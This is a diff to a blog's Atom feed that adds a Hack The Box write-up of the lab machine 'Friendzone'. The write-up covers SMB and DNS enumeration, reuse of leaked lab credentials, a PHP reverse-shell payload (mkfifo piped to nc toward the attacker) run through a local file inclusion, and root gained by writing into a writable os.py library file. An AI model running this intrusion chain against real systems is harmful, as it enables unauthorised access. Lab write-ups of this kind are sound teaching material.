@@ -1,4 +1,245 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-06T17:19:04+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Hackback</title><link href="http://localhost:4000/hack-the-box/hackback/" rel="alternate" type="text/html" title="Hack The Box - Hackback" /><published>2019-07-06T00:00:00+02:00</published><updated>2019-07-06T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/hackback</id><content type="html" xml:base="http://localhost:4000/hack-the-box/hackback/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-13T16:41:25+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Friendzone</title><link href="http://localhost:4000/hack-the-box/friendzone/" rel="alternate" type="text/html" title="Hack The Box - Friendzone" /><published>2019-07-13T00:00:00+02:00</published><updated>2019-07-13T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/friendzone</id><content type="html" xml:base="http://localhost:4000/hack-the-box/friendzone/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-friendzone-retired-and-heres-my-write-up-about-it-friendzone-was-a-very-nice-and-easy-box-i-enjoyed-solving-it-and-i-really-liked-it-it-had-a-lot-of-funny-parts-as-well-its-a-linux-box-and-its-ip-is-101010123-i-added-it-to-etchosts-as-friendzonehtb-lets-jump-right-in-&quot;&gt;Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.123&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzone.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT friendzone.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/friendzone/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;note--i-didnt-do-a-script-scan--sc-because-for-some-reason-it-took-a-lot-of-time-and-didnt-finish&quot;&gt;Note : I didn’t do a script scan (&lt;code class=&quot;highlighter-rouge&quot;&gt;-sC&lt;/code&gt;) because for some reason it took a lot of time and didn’t finish.&lt;/h4&gt;
+&lt;h4 id=&quot;we-got-ftp-on-port-21-ssh-on-port-22-dns-on-port-53-http-on-port-80-https-on-port-443-and-smb-unfortunately-anonymous-login-wasnt-allowed-on-ftp-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; on port 53, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;. Unfortunately anonymous login wasn’t allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb 
+Connected to friendzone.htb.
+220 (vsFTPd 3.0.3)
+Name (friendzone.htb:root): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;lets-check-smb&quot;&gt;Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
+&lt;h4 id=&quot;i-used-smbclient-to-list-the-shares-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient --list friendzone.htb -U &quot;&quot;
+Enter WORKGROUP\'s password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        Files           Disk      FriendZone Samba Server Files /etc/Files
+        general         Disk      FriendZone Samba Server Files
+        Development     Disk      FriendZone Samba Server Files
+        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            FRIENDZONE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-also-used-smbmap-to-know-what-permissions-do-i-have--smbmap--h-friendzonehtb--i-found-that-i-had-read-access-to-general-and-readwrite-access-to-development-i-also-noticed-that-the-comment-of-the-share-files-discloses-the-path-of-that-share--etcfiles-so-we-can-assume-that-all-shares-are-in-etc&quot;&gt;I also used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap&lt;/code&gt; to know what permissions do I have : &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H friendzone.htb&lt;/code&gt;.  I found that I had read access to &lt;code class=&quot;highlighter-rouge&quot;&gt;general&lt;/code&gt; and read/write access to &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt;. I also noticed that the comment of the share &lt;code class=&quot;highlighter-rouge&quot;&gt;Files&lt;/code&gt; discloses the path of that share : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Files&lt;/code&gt;, so we can assume that all shares are in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;in-general-i-found-a-file-called-credstxt-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;general&lt;/code&gt; I found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;creds.txt&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/general -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Wed Jan 16 22:10:51 2019
+  ..                                  D        0  Wed Jan 23 23:51:02 2019
+  creds.txt                           N       57  Wed Oct 10 01:52:42 2018
+
+                9221460 blocks of size 1024. 6434016 blocks available
+smb: \&amp;gt; get creds.txt 
+getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# cat creds.txt 
+creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;so-we-have-credentials-but-we-dont-know-where-to-use-them-it-says-creds-for-the-admin-thing-so-lets-keep-enumerating-until-we-find-that-admin-thing&quot;&gt;So we have credentials but we don’t know where to use them, it says &lt;code class=&quot;highlighter-rouge&quot;&gt;creds for the admin THING&lt;/code&gt;, so let’s keep enumerating until we find that admin thing.&lt;/h4&gt;
+&lt;h4 id=&quot;development-was-just-empty-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; was just empty :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Fri Jul 12 13:17:50 2019
+  ..                                  D        0  Wed Jan 23 23:51:02 2019
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;but-since-we-have-write-access-to-that-share-and-we-know-its-path--etcdevelopment-then-that-share-can-help-us-later-if-we-have-a-an-lfi-or-a-similar-vulnerability&quot;&gt;But since we have write access to that share and we know its path : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt; then that share can help us later if we have a an &lt;code class=&quot;highlighter-rouge&quot;&gt;LFI&lt;/code&gt; or a similar vulnerability.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http-and-dns&quot;&gt;HTTP and DNS&lt;/h3&gt;
+&lt;h4 id=&quot;httpfriendzonehtb-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://friendzone.htb&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;a-static-page-not-really-interesting-i-noticed-that-email-at-the-bottom--infofriendzoneportalred-so-i-added-friendzoneportalred-to-etchosts-&quot;&gt;A static page, not really interesting, I noticed that email at the bottom : &lt;code class=&quot;highlighter-rouge&quot;&gt;info@friendzoneportal.red&lt;/code&gt; so I added &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzoneportal.red&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-httpfriendzoneportalred-was-just-the-same-thing-&quot;&gt;But &lt;code class=&quot;highlighter-rouge&quot;&gt;http://friendzoneportal.red&lt;/code&gt; was just the same thing :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-went-back-and-added-friendzonered-to-the-hosts-file-&quot;&gt;I went back and added &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzone.red&lt;/code&gt; to the hosts file :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-it-was-also-the-same-thing-then-i-remembered-that-theres-a-dns-server-so-i-used-dig-&quot;&gt;But it was also the same thing. Then I remembered that there’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; server so I used dig :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# dig axfr friendzone.red @10.10.10.123
+
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.5-P4-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr friendzone.red @10.10.10.123
+;; global options: +cmd
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.         604800  IN      AAAA    ::1
+friendzone.red.         604800  IN      NS      localhost.
+friendzone.red.         604800  IN      A       127.0.0.1
+administrator1.friendzone.red. 604800 IN A      127.0.0.1
+hr.friendzone.red.      604800  IN      A       127.0.0.1
+uploads.friendzone.red. 604800  IN      A       127.0.0.1
+friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 402 msec
+;; SERVER: 10.10.10.123#53(10.10.10.123)
+;; WHEN: Fri Jul 12 13:22:51 EET 2019
+;; XFR size: 8 records (messages 1, bytes 289)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;now-we-have--administrator1friendzonered-hrfriendzonered-and-uploadsfriendzonered-i-edited-the-hosts-file-again-&quot;&gt;now we have : &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator1.friendzone.red&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;hr.friendzone.red&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;uploads.friendzone.red&lt;/code&gt;. I edited the hosts file again :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-i-still-got-the-same-thing-i-ran-gobuster-and-got-wordpress-which-was-empty-&quot;&gt;But I still got the same thing, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got &lt;code class=&quot;highlighter-rouge&quot;&gt;/wordpress&lt;/code&gt; which was empty :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-robotstxt-which-wasnt-a-real-robotstxt-file-d&quot;&gt;And &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; which wasn’t a real &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file :D&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;there-was-another-https-port-so-i-tried-that&quot;&gt;There was another &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; port so I tried that.&lt;/h4&gt;
+&lt;h4 id=&quot;httpsfriendzonered-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://friendzone.red&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;httpsadministrator1friendzonered-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://administrator1.friendzone.red&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-this-is-the-administrator-thing-lets-try-the-credentials-we-have-&quot;&gt;So this is the “administrator thing” let’s try the credentials we have :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/11.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/friendzone/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;great-dashboardphp-&quot;&gt;Great. &lt;code class=&quot;highlighter-rouge&quot;&gt;/dashboard.php&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;lfi-in-dashboardphp-user-flag&quot;&gt;LFI in dashboard.php, User Flag&lt;/h3&gt;
+&lt;h4 id=&quot;as-you-can-see-its-complaining-about-missing-parameters-by-looking-at-the-example--image_idajpgpagenametimestamp-my-first-guess-was-that-dashboardphp-includes-the-php-file-provided-in-the-pagename-parameter-so-if-we-give-it-test-it-will-append-php-to-test-then-include-that-file-we-can-upload-files-to-the-smb-share-development-and-we-also-know-the-full-path--etcdevelopment-so-if-its-really-vulnerable-to-lfi-we-can-get-a-reverse-shell-easily-i-wrote-a-small-php-script-to-get-a-reverse-shell-&quot;&gt;As you can see it’s complaining about missing parameters, by looking at the example : &lt;code class=&quot;highlighter-rouge&quot;&gt;image_id=a.jpg&amp;amp;pagename=timestamp&lt;/code&gt; my first guess was that &lt;code class=&quot;highlighter-rouge&quot;&gt;dashboard.php&lt;/code&gt; includes the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file provided in the &lt;code class=&quot;highlighter-rouge&quot;&gt;pagename&lt;/code&gt; parameter. So if we give it &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; it will append &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; then include that file. We can upload files to the &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; and we also know the full path : &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt;, so if it’s really vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;LFI&lt;/code&gt; we can get a reverse shell easily. I wrote a small &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script to get a reverse shell :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f');
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-uploaded-it-to-development-&quot;&gt;Then I uploaded it to &lt;code class=&quot;highlighter-rouge&quot;&gt;Development&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# smbclient //friendzone.htb/development -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; put rev.php 
+putting file rev.php as \rev.php (0.3 kb/s) (average 0.3 kb/s)
+smb: \&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-finally-i-tested-my-idea-&quot;&gt;And finally I tested my idea :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&amp;amp;pagename=/etc/Development/rev&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/friendzone/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-worked-and-now-we-have-a-reverse-shell-as-www-data-&quot;&gt;It worked and now we have a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;ssh-as-friend-privilege-escalation&quot;&gt;SSH as friend, Privilege Escalation&lt;/h3&gt;
+&lt;h4 id=&quot;i-looked-into-varwww-and-found-a-file-called-mysql_dataconf-which-had-some-credentials-&quot;&gt;I looked into &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; and found a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_data.conf&lt;/code&gt; which had some credentials :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ls -la
+total 36
+drwxr-xr-x  8 root root 4096 Oct  6  2018 .
+drwxr-xr-x 12 root root 4096 Oct  6  2018 ..
+drwxr-xr-x  3 root root 4096 Jan 16 22:13 admin
+drwxr-xr-x  4 root root 4096 Oct  6  2018 friendzone
+drwxr-xr-x  2 root root 4096 Oct  6  2018 friendzoneportal
+drwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmin
+drwxr-xr-x  3 root root 4096 Oct  6  2018 html
+-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
+drwxr-xr-x  3 root root 4096 Oct  6  2018 uploads
+$ cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-could-get-ssh-access-as-friend-with-them-&quot;&gt;I could get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; access as friend with them :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/friendzone# ssh friend@friendzone.htb
+The authenticity of host 'friendzone.htb (10.10.10.123)' can't be established.
+ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'friendzone.htb,10.10.10.123' (ECDSA) to the list of known hosts.
+friend@friendzone.htb's password:
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                             
+
+You have mail.
+Last login: Fri Jul 12 14:26:57 2019 from 10.10.13.142
+friend@FriendZone:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-did-the-regular-enumeration-and-i-ran-pspy-to-monitor-the-processes-to-see-if-theres-something-that-can-be-exploited-&quot;&gt;I did the regular enumeration and I ran &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt;&lt;/a&gt; to monitor the processes to see if there’s something that can be exploited :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;after-some-time-i-saw-this-&quot;&gt;After some time I saw this :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;root-runs-optserver_adminreporterpy--from-time-to-time&quot;&gt;Root runs &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/server_admin/reporter.py&lt;/code&gt;  from time to time.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/opt/server_admin$ cat reporter.py 
+#!/usr/bin/python
+
+import os
+
+to_address = &quot;admin1@friendzone.com&quot;
+from_address = &quot;admin2@friendzone.com&quot;
+
+print &quot;[+] Trying to send email to %s&quot;%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;so-if-we-can-write-to-that-script-then-we-can-get-a-shell-as-root-unfortunately-we-cant-&quot;&gt;So if we can write to that script then we can get a shell as root. Unfortunately we can’t :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-i-noticed-that-its-importing-the-os-library-usually-python-libraries-are-only-writable-by-root-but-i-checked-ospy-and-friend-had-permissions-to-write-to-it-&quot;&gt;But I noticed that it’s importing the &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; library. Usually python libraries are only writable by root, but I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;os.py&lt;/code&gt; and friend had permissions to write to it :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
+-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
+-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
+-rw-rw-r--  1 friend friend    476 Jul 12 14:39 os.py
+-rw-r--r--  1 root   root     1187 Jul 12 14:40 os.pyc
+-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
+-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
+-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
+-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
+-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
+-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;so-i-just-put-those-two-lines-at-the-bottom-of-ospy-&quot;&gt;So I just put those two lines at the bottom of &lt;code class=&quot;highlighter-rouge&quot;&gt;os.py&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-after-a-minute-i-got-a-shell-&quot;&gt;And after a minute I got a shell :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---hackback&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hackback/&quot;&gt;Hack The Box - Hackback&lt;/a&gt;&lt;/h4&gt;
